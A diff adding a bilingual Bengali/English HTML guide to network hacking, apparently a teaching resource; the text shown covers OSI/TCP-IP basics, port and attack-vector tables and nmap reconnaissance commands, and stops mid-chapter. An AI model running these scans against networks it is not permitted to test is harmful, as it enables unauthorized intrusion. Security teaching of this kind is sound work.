@@ -1,0 +1,1877 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Hacking & Wireless Security — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary:#0d1b2a;--secondary:#1b2838;--accent:#e63946;
+    --green:#2dc653;--yellow:#ffd60a;--blue:#0077b6;
+    --purple:#7b2d8b;--orange:#f4831f;
+    --code-bg:#0d1117;--code-border:#30363d;
+    --text:#1a1a2e;--bg:#f0f2f5;--card:#ffffff;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:'Hind Siliguri','Noto Sans Bengali',sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.9;}
+  .lang-en .bn-text{display:none;} .lang-en .en-text{display:inline;}
+  .en-text{display:none;} .bn-text{display:inline;}
+
+  /* CONTROLS */
+  .controls{position:fixed;top:20px;right:20px;z-index:1000;display:flex;gap:8px;flex-direction:column;}
+  .ctrl-btn{padding:8px 16px;border-radius:20px;border:none;cursor:pointer;font-family:'Hind Siliguri',sans-serif;font-size:13px;font-weight:600;transition:all 0.3s;box-shadow:0 4px 15px rgba(0,0,0,0.3);}
+  #themeBtn{background:#2dc653;color:#0d1b2a;}
+  #langBtn{background:#0077b6;color:white;}
+  #pdfBtn{background:#e63946;color:white;}
+
+  /* DARK MODE */
+  .dark-mode{--bg:#0d1117;--text:#c9d1d9;--card:#161b22;}
+  .dark-mode .chapter,.dark-mode .toc{background:#161b22;color:#c9d1d9;}
+  .dark-mode h2.sec{color:#c9d1d9;} .dark-mode h3.sub{color:#8b949e;}
+  .dark-mode p{color:#c9d1d9;} .dark-mode table{color:#c9d1d9;}
+  .dark-mode td,.dark-mode th{border-color:#30363d;}
+  .dark-mode thead tr{background:#21262d;} .dark-mode tr:nth-child(even){background:#1c2128;}
+  .dark-mode .info{background:#0c2233;color:#79c0ff;}
+  .dark-mode .warn{background:#2d1b00;color:#e3b341;}
+  .dark-mode .danger{background:#2d0a0a;color:#ff7b72;}
+  .dark-mode .success{background:#0d2818;color:#3fb950;}
+  .dark-mode .card{background:#21262d;border-color:#30363d;color:#c9d1d9;}
+  .dark-mode .chapter-summary{background:#21262d;border-color:#2dc653;color:#c9d1d9;}
+  .dark-mode .toc-main{color:#c9d1d9;border-color:#30363d;}
+  .dark-mode .toc-sub{color:#8b949e;}
+  .dark-mode code{background:#21262d;}
+
+  /* PRINT */
+  @media print{
+    .controls{display:none!important;}
+    .chapter{page-break-before:always;}
+    .cover{page-break-after:always;min-height:auto;}
+    .toc{page-break-after:always;}
+    body{background:white!important;}
+    .dark-mode .chapter,.dark-mode .toc{background:white!important;color:#1a1a2e!important;}
+    .dark-mode p,.dark-mode h2.sec,.dark-mode td,.dark-mode th{color:#1a1a2e!important;}
+  }
+
+  /* COVER */
+  .cover{background:linear-gradient(135deg,#0d1b2a 0%,#1b2838 50%,#16213e 100%);color:white;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:60px 40px;position:relative;overflow:hidden;}
+  .cover::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(45,198,83,0.03) 30px,rgba(45,198,83,0.03) 31px);}
+  .cover-icon{font-size:90px;margin-bottom:20px;position:relative;}
+  .cover h1{font-size:42px;font-weight:700;color:var(--green);text-shadow:0 0 30px rgba(45,198,83,0.5);}
+  .cover h2{font-size:24px;font-weight:400;opacity:0.8;margin:10px 0 25px;}
+  .cover .divider{width:120px;height:3px;background:var(--accent);margin:20px auto;border-radius:2px;}
+  .cover .desc{font-size:16px;opacity:0.7;max-width:650px;line-height:2;}
+  .cover .badge{display:inline-block;background:rgba(45,198,83,0.15);border:1px solid rgba(45,198,83,0.3);padding:6px 18px;border-radius:20px;margin:5px;font-size:13px;color:#a8dadc;}
+  .cover .terminal{background:rgba(0,0,0,0.5);border:1px solid rgba(45,198,83,0.3);border-radius:10px;padding:20px 30px;margin-top:30px;font-family:'Courier New',monospace;font-size:14px;color:var(--green);text-align:left;max-width:500px;}
+  .cover .terminal .pr{color:#89b4fa;}
+
+  /* TOC */
+  .toc{background:white;padding:50px 60px;}
+  .toc-header{font-size:30px;color:var(--primary);border-bottom:4px solid var(--green);padding-bottom:15px;margin-bottom:35px;}
+  .toc-main{display:flex;justify-content:space-between;padding:10px 0;font-weight:700;font-size:16px;color:var(--primary);border-bottom:1px solid #eee;margin-top:15px;}
+  .toc-main .num{color:var(--green);margin-right:10px;}
+  .toc-sub{display:flex;justify-content:space-between;padding:5px 0 5px 30px;color:#666;font-size:13.5px;border-bottom:1px dotted #f0f0f0;}
+
+  /* CHAPTERS */
+  .chapter{background:white;margin:0;page-break-before:always;}
+  .chapter-header{padding:40px 55px;position:relative;overflow:hidden;}
+  .ch1 .chapter-header{background:linear-gradient(135deg,#0d1b2a,#1b3a4b);}
+  .ch2 .chapter-header{background:linear-gradient(135deg,#1b2838,#2d3561);}
+  .ch3 .chapter-header{background:linear-gradient(135deg,#0d1b2a,#1a3c34);}
+  .ch4 .chapter-header{background:linear-gradient(135deg,#1b0000,#4a0000);}
+  .ch5 .chapter-header{background:linear-gradient(135deg,#16213e,#0f3460);}
+  .ch6 .chapter-header{background:linear-gradient(135deg,#2d1b69,#3d2b8e);}
+  .ch7 .chapter-header{background:linear-gradient(135deg,#1a1000,#3d2800);}
+  .ch8 .chapter-header{background:linear-gradient(135deg,#0d2818,#1a4731);}
+  .ch9 .chapter-header{background:linear-gradient(135deg,#1a0d26,#3d1f5c);}
+  .ch10 .chapter-header{background:linear-gradient(135deg,#0d1a0d,#1a3a1a);}
+  .ch11 .chapter-header{background:linear-gradient(135deg,#1a1a2e,#16213e);}
+  .ch12 .chapter-header{background:linear-gradient(135deg,#0d1b2a,#2d1b00);}
+  .chapter-header::after{content:'';position:absolute;top:-30px;right:-30px;width:150px;height:150px;border-radius:50%;background:rgba(255,255,255,0.03);}
+  .chapter-label{font-size:11px;letter-spacing:4px;color:var(--green);text-transform:uppercase;margin-bottom:10px;}
+  .chapter-title{font-size:30px;color:white;font-weight:700;}
+  .chapter-desc{font-size:14px;color:rgba(255,255,255,0.6);margin-top:8px;}
+  .chapter-body{padding:40px 55px;}
+
+  /* HEADINGS */
+  h2.sec{font-size:22px;color:var(--primary);margin:35px 0 15px;padding-left:18px;border-left:5px solid var(--green);}
+  h3.sub{font-size:17px;color:#1b3a4b;margin:25px 0 12px;padding-bottom:6px;border-bottom:2px dashed #e0e0e0;}
+  h4.mini{font-size:15px;color:#333;margin:18px 0 8px;font-weight:600;}
+  p{margin-bottom:14px;text-align:justify;}
+
+  /* CODE */
+  .code{background:var(--code-bg);color:#c9d1d9;padding:20px 25px;border-radius:10px;font-family:'Courier New',monospace;font-size:13px;margin:18px 0;line-height:1.8;overflow-x:auto;border:1px solid var(--code-border);border-left:4px solid var(--green);white-space:pre;}
+  .code .c{color:#6e7681;} .code .k{color:#ff7b72;} .code .s{color:#a5d6ff;}
+  .code .p{color:#f0883e;} .code .g{color:var(--green);} .code .y{color:#e3b341;}
+  .code .fn{color:#d2a8ff;} .code .num{color:#79c0ff;}
+  code{background:#1b2838;color:#79c0ff;padding:2px 8px;border-radius:4px;font-family:'Courier New',monospace;font-size:13px;}
+
+  /* BOXES */
+  .box{padding:18px 22px;border-radius:10px;margin:20px 0;border-left:5px solid;}
+  .info{background:#e8f4fd;border-color:#0077b6;color:#023e8a;}
+  .warn{background:#fff8e6;border-color:#f4831f;color:#7b3f00;}
+  .danger{background:#fde8ea;border-color:#e63946;color:#9b1d20;}
+  .success{background:#e8f8ed;border-color:#2dc653;color:#1a4731;}
+
+  /* TABLE */
+  table{width:100%;border-collapse:collapse;margin:20px 0;font-size:13.5px;}
+  th,td{padding:10px 15px;border:1px solid #dee2e6;text-align:left;}
+  thead tr{background:var(--primary);color:white;}
+  tr:nth-child(even){background:#f8f9fa;}
+
+  /* GRID */
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin:20px 0;}
+  .grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:15px;margin:20px 0;}
+  .card{background:#f8f9fa;padding:20px;border-radius:10px;border:1px solid #e0e0e0;}
+
+  .badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;}
+  .badge-g{background:#e8f8ed;color:#1a4731;} .badge-r{background:#fde8ea;color:#9b1d20;}
+  .badge-b{background:#e8f4fd;color:#023e8a;} .badge-y{background:#fff8e6;color:#7b3f00;}
+
+  .chapter-summary{background:#f0fff4;border:2px solid var(--green);border-radius:12px;padding:25px 30px;margin:30px 0;}
+  .chapter-summary h3{color:#1a4731;margin-bottom:12px;}
+  .chapter-summary ul{list-style:none;}
+  .chapter-summary li{padding:4px 0;}
+  ul li,ol li{margin:6px 0;}
+
+  .roadmap{display:flex;flex-direction:column;gap:10px;margin:20px 0;}
+  .road-item{display:flex;align-items:center;gap:15px;padding:12px 18px;border-radius:8px;background:#f8f9fa;border-left:4px solid var(--green);}
+  .road-item.red{border-color:var(--accent);} .road-item.blue{border-color:var(--blue);}
+  .road-item.purple{border-color:var(--purple);} .road-item.orange{border-color:var(--orange);}
+
+  .proto-box{background:linear-gradient(135deg,#0d1b2a,#1b2838);color:white;padding:20px 25px;border-radius:12px;margin:15px 0;font-family:'Courier New',monospace;font-size:13px;}
+  .layer{display:flex;align-items:center;gap:15px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.1);}
+  .layer:last-child{border-bottom:none;}
+  .layer-num{background:var(--green);color:#0d1b2a;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;}
+  .layer-name{color:#ffd60a;font-weight:700;min-width:120px;}
+  .layer-proto{color:#a5d6ff;}
+
+  @media(max-width:768px){
+    .chapter-body{padding:25px 20px;}
+    .grid2,.grid3{grid-template-columns:1fr;}
+    .cover h1{font-size:28px;}
+    .toc{padding:30px 20px;}
+  }
+</style>
+</head>
+<body class="light-mode">
+
+<div class="controls">
+  <button class="ctrl-btn" id="themeBtn" onclick="toggleTheme()">🌙 Dark Mode</button>
+  <button class="ctrl-btn" id="langBtn" onclick="toggleLang()">🇬🇧 English</button>
+  <button class="ctrl-btn" id="pdfBtn" onclick="savePDF()">📄 Save PDF</button>
+</div>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-icon">📡</div>
+  <h1>Network Hacking & Wireless Security</h1>
+  <h2><span class="bn-text">সাইবার সিকিউরিটির জন্য সম্পূর্ণ নেটওয়ার্ক গাইড</span><span class="en-text">Complete Network Guide for Cyber Security</span></h2>
+  <div class="divider"></div>
+  <p class="desc">
+    <span class="bn-text">OSI Model থেকে WiFi Cracking পর্যন্ত — Network Security শেখার একমাত্র সম্পূর্ণ বাংলা রিসোর্স। এই গাইড পড়লে আর কোনো বই বা কোর্সের দরকার নেই।</span>
+    <span class="en-text">From OSI Model to WiFi Security — the only complete Bengali resource for Network Security. After reading this, no other book or course needed.</span>
+  </p>
+  <div style="margin-top:20px;">
+    <span class="badge">🌐 OSI/TCP-IP</span>
+    <span class="badge">🔍 Reconnaissance</span>
+    <span class="badge">📶 WiFi Security</span>
+    <span class="badge">🎭 MITM Attack</span>
+    <span class="badge">👃 Packet Sniffing</span>
+    <span class="badge">🔒 Firewall Bypass</span>
+    <span class="badge">🛡️ Network Defense</span>
+    <span class="badge">🔧 Wireshark</span>
+    <span class="badge">📡 Aircrack-ng</span>
+  </div>
+  <div class="terminal">
+    <div><span class="pr">root@kali:~# </span>iwconfig</div>
+    <div style="color:#a5d6ff">wlan0  IEEE 802.11  Mode:Monitor</div>
+    <div><span class="pr">root@kali:~# </span>airodump-ng wlan0mon</div>
+    <div style="color:#2dc653"> BSSID              PWR  Beacons  #Data  CH  MB  ENC</div>
+    <div style="color:#2dc653"> AA:BB:CC:DD:EE:FF  -45      120     45   6  54  WPA2</div>
+    <div style="color:#ffd60a">[*] Target network found...</div>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-header">📋 <span class="bn-text">সূচিপত্র</span><span class="en-text">Table of Contents</span></div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">01.</span> <span class="bn-text">Network Fundamentals — OSI ও TCP/IP</span><span class="en-text">Network Fundamentals — OSI & TCP/IP</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">OSI 7 Layer, TCP/IP, Protocols, Ports, IP Addressing, Subnetting</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">02.</span> <span class="bn-text">Network Reconnaissance</span><span class="en-text">Network Reconnaissance</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Nmap, Passive Recon, OSINT, DNS Enumeration, Service Detection</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">03.</span> <span class="bn-text">Wireless Security Protocols</span><span class="en-text">Wireless Security Protocols</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">WEP, WPA, WPA2, WPA3, 802.11 Standards, Encryption Mechanisms</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">04.</span> <span class="bn-text">Wireless Attacks</span><span class="en-text">Wireless Attacks</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Monitor Mode, Handshake Capture, Deauth, Evil Twin, WPS Attack</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">05.</span> <span class="bn-text">Packet Sniffing ও Analysis</span><span class="en-text">Packet Sniffing & Analysis</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Wireshark, tcpdump, Scapy, Traffic Analysis, Credential Capture</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">06.</span> <span class="bn-text">MITM — Man-in-the-Middle</span><span class="en-text">MITM — Man-in-the-Middle</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">ARP Spoofing, DNS Spoofing, SSL Strip, Bettercap</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">07.</span> <span class="bn-text">Network Service Attacks</span><span class="en-text">Network Service Attacks</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">FTP/SSH/Telnet/SMB/RDP Brute Force, Exploitation</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">08.</span> <span class="bn-text">Firewall ও IDS Evasion</span><span class="en-text">Firewall & IDS Evasion</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Firewall Rules, Port Knocking, Tunneling, Fragmentation</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">09.</span> <span class="bn-text">VPN ও Tunneling</span><span class="en-text">VPN & Tunneling</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">SSH Tunneling, Proxychains, Tor, OpenVPN, WireGuard</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">10.</span> <span class="bn-text">Network Defense ও Hardening</span><span class="en-text">Network Defense & Hardening</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Firewall Setup, IDS/IPS, Network Segmentation, WiFi Hardening</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">11.</span> <span class="bn-text">Tools Reference</span><span class="en-text">Tools Reference</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Nmap, Wireshark, Aircrack-ng, Bettercap, Metasploit, netdiscover</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">12.</span> <span class="bn-text">Real-World Lab Scenarios</span><span class="en-text">Real-World Lab Scenarios</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Home Lab Setup, Practice Networks, CTF Network Challenges</span></span></div>
+  </div>
+</div>
+
+<!-- CH1: NETWORK FUNDAMENTALS -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 01</div>
+    <div class="chapter-title">🌐 <span class="bn-text">Network Fundamentals — OSI ও TCP/IP</span><span class="en-text">Network Fundamentals — OSI & TCP/IP</span></div>
+    <div class="chapter-desc"><span class="bn-text">Network hacking বুঝতে হলে এই foundation টা জানতেই হবে</span><span class="en-text">This foundation is mandatory to understand network hacking</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🏗️ <span class="bn-text">OSI Model — ৭ Layer</span><span class="en-text">OSI Model — 7 Layers</span></h2>
+    <p><span class="bn-text">OSI (Open Systems Interconnection) Model হলো network communication-এর theoretical framework। প্রতিটা layer-এ আলাদা attack করা যায়। Security professional হিসেবে প্রতিটা layer জানা বাধ্যতামূলক।</span><span class="en-text">The OSI Model is the theoretical framework for network communication. Each layer can be attacked differently. Knowing every layer is mandatory as a security professional.</span></p>
+
+    <div class="proto-box">
+      <div class="layer"><span class="layer-num">7</span><span class="layer-name">Application</span><span class="layer-proto">HTTP, HTTPS, FTP, SSH, DNS, SMTP, SNMP</span></div>
+      <div class="layer"><span class="layer-num">6</span><span class="layer-name">Presentation</span><span class="layer-proto">SSL/TLS, Encryption, Encoding (ASCII, JPEG)</span></div>
+      <div class="layer"><span class="layer-num">5</span><span class="layer-name">Session</span><span class="layer-proto">NetBIOS, RPC, Session management</span></div>
+      <div class="layer"><span class="layer-num">4</span><span class="layer-name">Transport</span><span class="layer-proto">TCP (reliable), UDP (fast), Port numbers</span></div>
+      <div class="layer"><span class="layer-num">3</span><span class="layer-name">Network</span><span class="layer-proto">IP, ICMP, OSPF, BGP — Routing</span></div>
+      <div class="layer"><span class="layer-num">2</span><span class="layer-name">Data Link</span><span class="layer-proto">Ethernet, MAC address, ARP, Switch</span></div>
+      <div class="layer"><span class="layer-num">1</span><span class="layer-name">Physical</span><span class="layer-proto">Cables, WiFi signals, Hub, Repeater</span></div>
+    </div>
+
+    <div class="grid2">
+      <div class="card">
+        <h4>⚔️ <span class="bn-text">Layer-এ Attack</span><span class="en-text">Attacks per Layer</span></h4>
+        <ul>
+          <li><strong>L7:</strong> SQL Injection, XSS, DNS Poison</li>
+          <li><strong>L6:</strong> SSL Strip, Certificate Spoof</li>
+          <li><strong>L5:</strong> Session Hijack</li>
+          <li><strong>L4:</strong> SYN Flood, Port Scan</li>
+          <li><strong>L3:</strong> IP Spoofing, ICMP Flood</li>
+          <li><strong>L2:</strong> ARP Spoof, MAC Flood</li>
+          <li><strong>L1:</strong> Physical Tap, Jamming</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>🛡️ <span class="bn-text">Layer-এ Defense</span><span class="en-text">Defense per Layer</span></h4>
+        <ul>
+          <li><strong>L7:</strong> WAF, Input Validation</li>
+          <li><strong>L6:</strong> Strong TLS (1.3), HSTS</li>
+          <li><strong>L5:</strong> Session Timeout, Re-auth</li>
+          <li><strong>L4:</strong> Rate Limiting, Firewall</li>
+          <li><strong>L3:</strong> Ingress Filtering, ACL</li>
+          <li><strong>L2:</strong> DAI, Port Security</li>
+          <li><strong>L1:</strong> Physical Security</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🔄 <span class="bn-text">TCP/IP Model ও Protocols</span><span class="en-text">TCP/IP Model & Protocols</span></h2>
+    <table>
+      <thead><tr><th>Layer</th><th>Protocol</th><th>Port</th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th><th><span class="bn-text">Attack Vector</span></th></tr></thead>
+      <tbody>
+        <tr><td>Application</td><td>HTTP</td><td>80</td><td><span class="bn-text">Web traffic</span></td><td>Sniffing, SQLi, XSS</td></tr>
+        <tr><td>Application</td><td>HTTPS</td><td>443</td><td><span class="bn-text">Encrypted web</span></td><td>SSL Strip, Cert spoof</td></tr>
+        <tr><td>Application</td><td>FTP</td><td>21</td><td><span class="bn-text">File transfer</span></td><td>Brute force, Sniff</td></tr>
+        <tr><td>Application</td><td>SSH</td><td>22</td><td><span class="bn-text">Secure shell</span></td><td>Brute force, Key theft</td></tr>
+        <tr><td>Application</td><td>Telnet</td><td>23</td><td><span class="bn-text">Remote shell (insecure)</span></td><td>Plaintext sniffing</td></tr>
+        <tr><td>Application</td><td>DNS</td><td>53</td><td><span class="bn-text">Name resolution</span></td><td>DNS Spoofing, Cache Poison</td></tr>
+        <tr><td>Application</td><td>SMTP</td><td>25</td><td><span class="bn-text">Email send</span></td><td>Relay abuse, Phishing</td></tr>
+        <tr><td>Application</td><td>SMB</td><td>445</td><td><span class="bn-text">File sharing (Windows)</span></td><td>EternalBlue, Pass-the-Hash</td></tr>
+        <tr><td>Application</td><td>RDP</td><td>3389</td><td><span class="bn-text">Remote Desktop</span></td><td>Brute force, BlueKeep</td></tr>
+        <tr><td>Transport</td><td>TCP</td><td>—</td><td><span class="bn-text">Reliable connection</span></td><td>SYN flood, RST inject</td></tr>
+        <tr><td>Transport</td><td>UDP</td><td>—</td><td><span class="bn-text">Fast, connectionless</span></td><td>UDP flood, Amplification</td></tr>
+        <tr><td>Network</td><td>ICMP</td><td>—</td><td><span class="bn-text">Ping, Error messages</span></td><td>Ping flood, Smurf attack</td></tr>
+        <tr><td>Network</td><td>ARP</td><td>—</td><td><span class="bn-text">IP→MAC resolution</span></td><td>ARP Spoofing (MITM)</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔢 <span class="bn-text">IP Addressing ও Subnetting</span><span class="en-text">IP Addressing & Subnetting</span></h2>
+    <div class="code"><span class="c"># IP Address Classes</span>
+<span class="c">Class A: 1.0.0.0   - 126.255.255.255  (Large networks)</span>
+<span class="c">Class B: 128.0.0.0 - 191.255.255.255  (Medium networks)</span>
+<span class="c">Class C: 192.0.0.0 - 223.255.255.255  (Small networks)</span>
+
+<span class="c"># Private IP Ranges (RFC 1918)</span>
+<span class="g">10.0.0.0/8</span>       <span class="c"># Class A private — 10.x.x.x</span>
+<span class="g">172.16.0.0/12</span>    <span class="c"># Class B private — 172.16.x.x to 172.31.x.x</span>
+<span class="g">192.168.0.0/16</span>   <span class="c"># Class C private — 192.168.x.x (home networks)</span>
+
+<span class="c"># Subnet Mask চেনা</span>
+/24  = 255.255.255.0    → <span class="num">254</span> hosts  (192.168.1.0/24)
+/16  = 255.255.0.0      → <span class="num">65534</span> hosts
+/8   = 255.0.0.0        → <span class="num">16777214</span> hosts
+/30  = 255.255.255.252  → <span class="num">2</span> hosts (point-to-point links)
+
+<span class="c"># নিজের IP/Network বের করো</span>
+<span class="p">$</span> ip addr show
+<span class="p">$</span> ip route show
+<span class="p">$</span> hostname -I
+
+<span class="c"># Network range calculate করো (Python)</span>
+<span class="k">import</span> ipaddress
+net = ipaddress.ip_network(<span class="s">"192.168.1.0/24"</span>)
+<span class="k">print</span>(<span class="s">f"Network:   {net.network_address}"</span>)
+<span class="k">print</span>(<span class="s">f"Broadcast: {net.broadcast_address}"</span>)
+<span class="k">print</span>(<span class="s">f"Hosts:     {net.num_addresses - 2}"</span>)
+<span class="k">for</span> ip <span class="k">in</span> <span class="fn">list</span>(net.hosts())[:<span class="num">5</span>]:
+    <span class="k">print</span>(ip)</div>
+
+    <h2 class="sec">🤝 <span class="bn-text">TCP Three-Way Handshake</span><span class="en-text">TCP Three-Way Handshake</span></h2>
+    <p><span class="bn-text">TCP connection এই 3-step process-এ establish হয়। Port scanner এবং firewall bypass বুঝতে এটা জানা অপরিহার্য।</span><span class="en-text">TCP connections are established via this 3-step process. Understanding this is essential for port scanners and firewall bypass.</span></p>
+    <div class="code"><span class="c">Client                    Server</span>
+  |                          |
+  |  ——— SYN ————————————→  |   <span class="c">Client: "সংযোগ করতে চাই" (seq=100)</span>
+  |  ←—— SYN-ACK ————————— |   <span class="c">Server: "ঠিক আছে, তুমি কি ready?" (seq=200, ack=101)</span>
+  |  ——— ACK ————————————→  |   <span class="c">Client: "হ্যাঁ, ready!" (ack=201)</span>
+  |                          |
+  |  [Connection Established]|
+
+<span class="c"># Port Scanner এই principle ব্যবহার করে:</span>
+<span class="c"># SYN পাঠাও → SYN-ACK পেলে = OPEN</span>
+<span class="c"># SYN পাঠাও → RST পেলে   = CLOSED</span>
+<span class="c"># SYN পাঠাও → No reply   = FILTERED (firewall)</span>
+
+<span class="c"># Nmap SYN scan (stealth — 3rd step complete করে না)</span>
+<span class="p">$</span> nmap -sS target_ip   <span class="c"># SYN scan (root needed)</span>
+<span class="p">$</span> nmap -sT target_ip   <span class="c"># Full TCP connect scan</span>
+<span class="p">$</span> nmap -sU target_ip   <span class="c"># UDP scan</span></div>
+
+    <h2 class="sec">📋 <span class="bn-text">Important Network Commands</span><span class="en-text">Important Network Commands</span></h2>
+    <div class="code"><span class="c"># Network interface দেখো</span>
+<span class="p">$</span> ip addr show          <span class="c"># IP addresses</span>
+<span class="p">$</span> ip link show          <span class="c"># Interface status</span>
+<span class="p">$</span> ifconfig              <span class="c"># Legacy (এখনও কাজ করে)</span>
+<span class="p">$</span> iwconfig              <span class="c"># Wireless interfaces</span>
+
+<span class="c"># Routing table</span>
+<span class="p">$</span> ip route show
+<span class="p">$</span> route -n
+
+<span class="c"># Active connections ও ports</span>
+<span class="p">$</span> ss -tlnp              <span class="c"># Listening TCP ports</span>
+<span class="p">$</span> ss -tulnp             <span class="c"># TCP + UDP</span>
+<span class="p">$</span> netstat -tulnp        <span class="c"># Legacy netstat</span>
+
+<span class="c"># ARP table (MAC addresses)</span>
+<span class="p">$</span> arp -a
+<span class="p">$</span> ip neigh show
+
+<span class="c"># DNS lookup</span>
+<span class="p">$</span> nslookup google.com
+<span class="p">$</span> dig google.com A
+<span class="p">$</span> dig google.com MX
+<span class="p">$</span> host google.com
+
+<span class="c"># Connectivity test</span>
+<span class="p">$</span> ping -c 4 8.8.8.8
+<span class="p">$</span> traceroute 8.8.8.8    <span class="c"># Route trace</span>
+<span class="p">$</span> mtr 8.8.8.8           <span class="c"># Live traceroute</span>
+
+<span class="c"># Firewall rules দেখো</span>
+<span class="p">$</span> iptables -L -n -v
+<span class="p">$</span> nft list ruleset      <span class="c"># nftables (modern)</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 1 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">OSI 7 layer ও প্রতিটায় কী attack হয় — জানো</span></li>
+        <li>✔ <span class="bn-text">TCP/IP protocols ও ports মুখস্থ করো</span></li>
+        <li>✔ <span class="bn-text">IP addressing, subnet calculation — practice করো</span></li>
+        <li>✔ <span class="bn-text">TCP 3-way handshake — port scanning-এর ভিত্তি</span></li>
+        <li>✔ <span class="bn-text">Basic Linux network commands — daily use করো</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH2: RECONNAISSANCE -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 02</div>
+    <div class="chapter-title">🔍 <span class="bn-text">Network Reconnaissance</span><span class="en-text">Network Reconnaissance</span></div>
+    <div class="chapter-desc"><span class="bn-text">Target সম্পর্কে তথ্য সংগ্রহের সম্পূর্ণ পদ্ধতি</span><span class="en-text">Complete methodology for gathering information about targets</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🗺️ <span class="bn-text">Reconnaissance Types</span><span class="en-text">Reconnaissance Types</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>👁️ <span class="bn-text">Passive Recon</span><span class="en-text">Passive Recon</span></h4>
+        <p><span class="bn-text">Target-এ কোনো packet না পাঠিয়ে তথ্য সংগ্রহ। Target জানতে পারে না।</span><span class="en-text">Gather info without sending packets to target. Target doesn't know.</span></p>
+        <ul>
+          <li>WHOIS lookup</li>
+          <li>DNS enumeration</li>
+          <li>Google Dorking</li>
+          <li>Shodan search</li>
+          <li>Social media OSINT</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>⚡ <span class="bn-text">Active Recon</span><span class="en-text">Active Recon</span></h4>
+        <p><span class="bn-text">Target-এ packet পাঠিয়ে তথ্য সংগ্রহ। IDS/firewall log হতে পারে।</span><span class="en-text">Gather info by sending packets to target. IDS/firewall may log it.</span></p>
+        <ul>
+          <li>Port scanning (Nmap)</li>
+          <li>Ping sweep</li>
+          <li>Banner grabbing</li>
+          <li>Service detection</li>
+          <li>OS fingerprinting</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🗺️ <span class="bn-text">Nmap — The King of Scanners</span><span class="en-text">Nmap — The King of Scanners</span></h2>
+    <div class="code"><span class="c"># ════ HOST DISCOVERY ════</span>
+<span class="p">$</span> nmap -sn 192.168.1.0/24           <span class="c"># Ping sweep (live hosts)</span>
+<span class="p">$</span> nmap -sn -PS22,80,443 10.0.0.0/24 <span class="c"># TCP SYN ping</span>
+<span class="p">$</span> nmap -PR 192.168.1.0/24            <span class="c"># ARP ping (local network)</span>
+
+<span class="c"># ════ PORT SCANNING ════</span>
+<span class="p">$</span> nmap 192.168.1.1                   <span class="c"># Top 1000 ports</span>
+<span class="p">$</span> nmap -p- 192.168.1.1               <span class="c"># All 65535 ports</span>
+<span class="p">$</span> nmap -p 22,80,443,3306 192.168.1.1 <span class="c"># Specific ports</span>
+<span class="p">$</span> nmap -p 1-1024 192.168.1.1         <span class="c"># Port range</span>
+
+<span class="c"># ════ SCAN TYPES ════</span>
+<span class="p">$</span> nmap -sS 192.168.1.1  <span class="c"># SYN scan (stealth, root)</span>
+<span class="p">$</span> nmap -sT 192.168.1.1  <span class="c"># TCP connect (no root needed)</span>
